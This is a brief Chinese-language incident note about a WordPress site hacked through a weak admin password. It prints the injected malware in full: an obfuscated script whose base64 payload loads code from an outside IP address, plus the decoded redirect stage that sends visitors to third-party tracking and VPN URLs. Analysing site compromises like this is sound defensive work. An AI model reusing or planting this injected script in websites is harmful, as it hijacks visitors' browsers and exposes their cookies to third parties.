# web security 案例

日常收集，工作网站被黑案例。

## XSS 攻击

背景：使用 WordPress 开发手机端，管理人员密码设置过于简单，被黑客在 post 中注入如下脚本，形成跨站脚本攻击：

```javascript
<p><!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOCUzNSUyRSUzMSUzNSUzNiUyRSUzMSUzNyUzNyUyRSUzOCUzNSUyRiUzNSU2MyU3NyUzMiU2NiU2QiUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>
```

该代码段获取了客户cookie信息，然后跳转到第三方的VPN中，收集用户信息。

跨域请求解析后路径：

```javascript
<script src=" http://185.156.177.85/5cw2fk"></script> 
```

解析后脚本请求：

```javascript
function process() {
                window.location = "https://click.unfurlable.com/ljexwvfocb";
            }
            window.onerror = process;
            process();
```

最终访问了熊猫VPN

![rLtAHRmwobQJ7IK](https://i.loli.net/2019/11/18/rLtAHRmwobQJ7IK.png)
